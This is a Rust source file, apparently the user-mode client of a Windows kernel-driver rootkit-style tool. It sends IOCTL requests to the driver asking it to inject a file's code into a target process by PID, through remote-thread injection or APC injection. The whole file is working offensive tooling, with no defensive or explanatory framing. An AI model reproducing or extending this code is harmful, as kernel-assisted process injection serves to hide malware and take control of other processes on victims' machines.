use {
    log::*,
    crate::{utils::open_driver, utils::check_file}, 
    core::ffi::c_void, 
    shared::structs::TargetInjection, 
    std::ptr::null_mut, 
    windows_sys::Win32::{Foundation::CloseHandle, System::IO::DeviceIoControl} 
};

pub fn injection_thread(ioctl_code: u32, pid: &u32, path: &String) {
    info!("Starting process injection for PID: {pid}, using file: {path}");

    let h_file = open_driver().expect("Failed to open driver");
    let status;

    info!("Checking if the file exists at the specified path");
    if !check_file(path) {
        error!("File not found at the specified path: {path}. Please check the file path and try again");
        return;
    }

    info!("File found!!!");
    debug!("Preparing injection structure");
    let mut info_injection = TargetInjection {
        path: path.to_string(),
        pid: *pid as usize
    };   

    let mut return_buffer = 0;

    debug!("Sending DeviceIoControl command to Process Injection");
    status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_injection as *mut _ as *mut c_void,
            std::mem::size_of::<TargetInjection>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        error!("DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        info!("Process injection was successfully performed on PID: {pid} using the file at path: {path}");
    }

    debug!("Closing the driver handle");
    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn injection_apc(ioctl_code: u32, pid: &u32, path: &String) {
    debug!("Starting APC injection for PID: {pid}, using file: {path}");

    debug!("Attempting to open the driver");
    let h_file = open_driver().expect("Failed to open driver");
    let status;

    info!("Checking if the file exists at the specified path");
    if !check_file(path) {
        error!("File not found at the specified path: {path}. Please check the file path and try again");
        return;
    }

    info!("File found!!!");
    debug!("Preparing injection structure");
    let mut info_injection = TargetInjection {
        path: path.to_string(),
        pid: *pid as usize
    };   

    debug!("Sending DeviceIoControl command to APC Injection");
    let mut return_buffer = 0;
    status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_injection as *mut _ as *mut c_void,
            std::mem::size_of::<TargetInjection>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        error!("DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        info!("APC Injection successfully performed on PID: {pid}");
    }

    debug!("Closing the driver handle");
    unsafe { 
        CloseHandle(h_file);
    };
}
